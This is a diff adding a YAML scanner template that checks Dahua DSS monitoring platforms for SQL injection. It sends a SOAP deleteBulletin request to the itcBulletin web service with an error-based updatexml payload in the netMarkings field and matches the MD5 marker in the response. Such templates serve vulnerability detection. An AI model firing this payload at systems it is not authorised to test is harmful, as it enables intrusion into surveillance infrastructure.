@@ -1,0 +1,23 @@
+name: 大华DSS综合监控管理平台-itcBulletin-SQL
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /portal/services/itcBulletin?wsdl
+    headers:
+      Content-Type: "application/xml"
+    body: |
+        <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
+          <s11:Body>
+            <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
+              <netMarkings>
+                (updatexml(1,concat(0x7e,md5('123456'),0x7e),1))) and (1=1
+              </netMarkings>
+            </ns1:deleteBulletin>
+          </s11:Body>
+        </s11:Envelope>
+    expression:
+      status: 500
+      body_all: ["e10adc3949ba59abbe56e057f20f883e"]
